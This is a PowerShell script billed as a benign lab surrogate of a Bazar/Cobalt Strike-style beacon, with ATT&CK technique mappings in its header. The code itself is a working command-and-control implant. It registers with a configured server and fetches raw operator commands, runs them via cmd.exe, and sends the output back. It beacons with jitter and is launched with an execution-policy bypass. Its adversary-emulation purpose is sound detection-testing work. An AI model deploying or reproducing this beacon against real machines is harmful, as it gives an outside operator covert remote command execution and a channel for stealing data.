# ============================================================
# c0015_beacon.ps1 — benign session beacon [LAB-SURROGATE]
#
# Campaign mapping:
#   - Bazar/CS-like callback loop over web channel      -> T1071.001 (context)
#   - public-IP check (myexternalip analog)             -> T1016
#   - operator-tasked command execution (v3: raw commands via /cmd; allowlist
#     tasks as fallback / idle keep-alive)                     -> C2 role surrogate
#
# NO HARDCODED LAB VALUES: everything is read from the config
# INI (-Config). Session token comes from environment
# ($env:C0015_SESSION_TOKEN) or is generated per run (S1-<16 hex>).
#
# Usage (operator/harness):
#   powershell -NoProfile -ExecutionPolicy Bypass -File c0015_beacon.ps1 -Config <ini> [-Once]
# ============================================================
param(
    [Parameter(Mandatory=$true)][string]$Config,
    [switch]$Once
)
$ErrorActionPreference = 'Stop'
# keep native stderr (e.g. a failing task command) from honoring ErrorActionPreference
$PSNativeCommandUseErrorActionPreference = $false

function Get-IniValue {
    param([string]$Path, [string]$Section, [string]$Key)
    $val = $null
    $cur = ''
    foreach ($ln in Get-Content -LiteralPath $Path) {
        $t = $ln.Trim()
        if ($t -match '^\[(.+)\]$') { $cur = $Matches[1] }
        elseif ($cur -eq $Section -and $t -like "$Key=*") { $val = $t.Substring($Key.Length + 1) }
    }
    return $val
}

# ---- config (no hardcoded lab values) ----
$cfg = Get-Item -LiteralPath $Config | ForEach-Object { $_.FullName }
$c2Url   = Get-IniValue $cfg 'c2sim' 'c2_url'
$stage   = Get-IniValue $cfg 'c2sim' 'stage'
$hostAlias = Get-IniValue $cfg 'c2sim' 'host_alias'
$runId   = Get-IniValue $cfg 'lab' 'run_id'
$loops   = [int](Get-IniValue $cfg 'beacon' 'loop_count')
$sleep   = [int](Get-IniValue $cfg 'beacon' 'loop_sleep_sec')
$jitter  = [int](Get-IniValue $cfg 'beacon' 'loop_sleep_jitter_sec')
if (-not $jitter) { $jitter = 0 }
$ipCheck = Get-IniValue $cfg 'beacon' 'public_ip_check_enabled'
$ipUrl   = Get-IniValue $cfg 'beacon' 'public_ip_check_url'
$cap     = [int](Get-IniValue $cfg 'beacon' 'result_cap_bytes')

# ---- allowlist fallback task map (v3: raw operator commands come from the server) ----
$taskMap = @{
    'T-DISCOVER-CORPUS' = Get-IniValue $cfg 'beacon' 'task_T-DISCOVER-CORPUS'
    'T-BEACON-SLEEP'    = Get-IniValue $cfg 'beacon' 'task_T-BEACON-SLEEP'
    'T-NOOP'            = Get-IniValue $cfg 'beacon' 'task_T-NOOP'
}

# ---- session token: env or generated per run (never stored) ----
$tokenEnv = Get-IniValue $cfg 'c2sim' 'token_env'
$token = $env:C0015_SESSION_TOKEN
if (-not $token) {
    # PowerShell 5.1 (Windows 10) has no static RandomNumberGenerator.GetBytes(int);
    # use the instance API available on both .NET Framework 4.x and .NET Core.
    $tokenBytes = New-Object 'System.Byte[]' 8
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    try { $rng.GetBytes($tokenBytes) } finally { $rng.Dispose() }
    $token = 'S1-' + ([BitConverter]::ToString($tokenBytes) -replace '-','').ToLower()
}

# ---- T1016: public-IP style check against lab mock ----
if ($ipCheck -eq '1' -and $ipUrl) {
    try { Invoke-WebRequest -Uri $ipUrl -UseBasicParsing -TimeoutSec 5 | Out-Null } catch { }
}

# ---- register + task/result loop (bounded) ----
$registerUrl = "$c2Url/session/register?stage=$stage&host=$hostAlias&token=$token&run=$runId"
try {
    Invoke-WebRequest -Method POST -Uri $registerUrl -UseBasicParsing -TimeoutSec 10 | Out-Null
} catch {
    Write-Output "register failed: $($_.Exception.Message)"; exit 1
}

$count = if ($Once) { 1 } else { $loops }
for ($i = 0; $i -lt $count; $i++) {
    $taskResp = Invoke-WebRequest -Method GET -Uri "$c2Url/task/next?session=$token" -UseBasicParsing -TimeoutSec 10
    $taskObj = ($taskResp.Content | ConvertFrom-Json)
    $task = $taskObj.task
    # v3: the server may task a RAW operator command (OP-CMD with .cmd); otherwise
    # fall back to the config task map (idle keep-alive => T-NOOP when unmapped).
    $cmd = $taskObj.cmd
    if (-not $cmd) { $cmd = $taskMap[$task] }
    if (-not $cmd) { $cmd = $taskMap['T-NOOP'] }
    # bounded benign execution of a tasked (operator or allowlist) command;
    # a task command may legitimately fail (e.g. no browser service in an
    # isolated lab) - capture its stderr as the result instead of aborting.
    $result = ''
    try {
        $result = (& cmd.exe /c $cmd 2>&1 | Out-String)
    } catch {
        $result = "task error: $($_.Exception.Message)"
    }
    if ($result.Length -gt $cap) { $result = $result.Substring(0, $cap) }
    if ([string]::IsNullOrWhiteSpace($result)) { $result = "(no output)" }
    $body = [System.Text.Encoding]::UTF8.GetBytes($result)
    Invoke-WebRequest -Method POST -Uri "$c2Url/result?session=$token&task=$task" -Body $body -UseBasicParsing -TimeoutSec 10 | Out-Null
    # realistic beacon cadence: fixed sleep + random jitter (Bazar/CS-like)
    $s = $sleep
    if ($jitter -gt 0) {
        $s = [Math]::Max(0, $sleep + (Get-Random -Minimum (-$jitter) -Maximum ($jitter + 1)))
    }
    Start-Sleep -Seconds $s
}
Write-Output "beacon cycle complete (stage=$stage host=$hostAlias token=${token})"
